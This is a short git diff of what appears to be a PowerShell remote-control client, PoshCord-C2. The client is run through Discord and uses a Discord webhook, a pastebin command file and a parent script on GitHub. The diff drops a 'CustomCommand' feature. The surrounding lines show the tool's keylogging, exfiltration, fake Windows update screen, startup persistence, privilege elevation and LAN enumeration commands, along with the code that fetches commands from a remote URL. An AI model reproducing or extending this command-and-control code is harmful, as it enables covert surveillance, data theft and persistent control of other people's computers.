@@ -23,8 +23,7 @@ USAGE
 5. Do the same with any other command listed - To run that module.
 
 EXTRA
-You can add custom scripting in a secondary hosted file, change YOUR_SECONDARY_FILE_URL to another text file and add code to it,
-then in the original hosted file save it with 'customcommand' as the contents 
+You can add custom scripting / commands - edit the hoted file to contain your custom powershell script.
 
 Killswitch
 Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
@@ -33,8 +32,6 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 # Uncomment the lines below and add your details
 # $hookurl = "YOUR_WEBHOOK_URL" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 # $GHurl = "YOUR_FILE_URL"  # eg. https://pastebin.com/raw/QtCxxxx
-
-# $CCurl = "YOUR_SECONDARY_FILE_URL"  # (optional)
 
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
@@ -59,7 +56,6 @@ $msgsys = "``========================================================
 = FakeUpdate : Spoof windows update screen.            =
 = AddPersistance : Add this script to startup.         =
 = RemovePersistance : Remove from startup              =
-= CustomCommand : Execute a github file as a script.   =
 = IsAdmin  : Check if the session is admin             =
 = AttemptElevate : Attempt to restart script as admin  =
 = EnumerateLAN  : Show devices on LAN (see ExtraInfo)  =
